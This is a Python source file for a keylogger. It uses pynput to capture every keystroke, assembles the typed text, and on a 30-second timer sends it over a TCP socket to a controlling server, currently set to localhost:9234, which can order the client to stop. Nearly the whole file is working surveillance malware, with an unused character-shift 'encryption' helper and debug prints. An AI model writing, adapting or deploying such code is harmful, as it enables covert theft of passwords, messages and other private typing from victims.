#author: lars 
import threading
import socket
import pynput 
from pynput import keyboard
from pynput.keyboard import Key, Listener 
        
logged_data=None
def main():
    #++~~~~~~~~~~ SYS VARS ~~~~~~~~~~++#
    DATA_STORAGE_TIME=30 #in seconds
    MESSAGE_PREFIX="$:"  #on start of every message
    SERVER_OK_RESP="!!"  #response expected by server if all correct
    #----------------------------------#
    logged_data=MESSAGE_PREFIX
    class Broadcast:
        def __init__(self,host_ip,host_port):
            self.host_ip=host_ip
            self.host_port=host_port

            self.socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.socket.connect((self.host_ip,self.host_port))
            
        def send(self,data_str):
           
            print("data str, send:",data_str)
            if data_str:
                self.socket.send(bytes(data_str,"utf-8"))
        def __str__(self):
            return f"Host IP:{self.host_ip} Host Port:{self.host_port}"
        def receive(self):
            while True:
                msg=self.socket.recv(1024)
                print("msg:",msg.decode("utf-8"))
                if msg.decode("utf-8"):
                    if msg.decode("utf-8")=="stop":
                        self.socket.close()
                        exit("Connection forced down by remote host")
                    elif msg.decode("utf-8")==SERVER_OK_RESP:
                        break
                    else:
                        print("received weird OK message")
    print("Started Target code...")
    
    SERVER_IP="localhost"
    SERVER_PORT=9234
    s=Broadcast(SERVER_IP,SERVER_PORT)
    #msg=s.recv(1024)
    #print(msg.decode("utf-8"))
    
    #make sure file exists
    def log_data():
        
        keys = [] 
        
        def on_press(key): 
            
            keys.append(key) 
            write_data(keys) 
            
            
        def write_data(keys): 
            global logged_data
            
            for i in range(len(keys)): 
                
                if keys[0]==keyboard.Key.space:
                    logged_data+=" "
                elif keys[0]==keyboard.Key.backspace:
                    logged_data=logged_data[:-1]
                else:
                    k = str(keys[0]).replace("'", "")
                    if len(k)>1:
                        logged_data+=" "+k+" "
                    else:
                        logged_data+=k
                keys.pop(0)
        def on_release(key): 
            if key == Key.esc: 
                # Stop listener 
                return False
        
        
        with Listener(on_press = on_press, 
                    on_release = on_release) as listener: 
                            
            listener.join()
    #+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+#
    
    def send_data(data):
        s.send(data)
    def enc_data(data):
        #doing ascci shift
        res=""
        for i in data:
            try:
                res+=chr(ord(i)+11)
            except Exception as e:
                res+=i
        return res
    def scheduler():
        global logged_data
        threading.Timer(DATA_STORAGE_TIME,scheduler).start()
        
        print(logged_data)
        send_data(logged_data)
        logged_data=MESSAGE_PREFIX

    scheduler()#active mode for debugging
    log_data()

    
if __name__=="__main__":
    main()
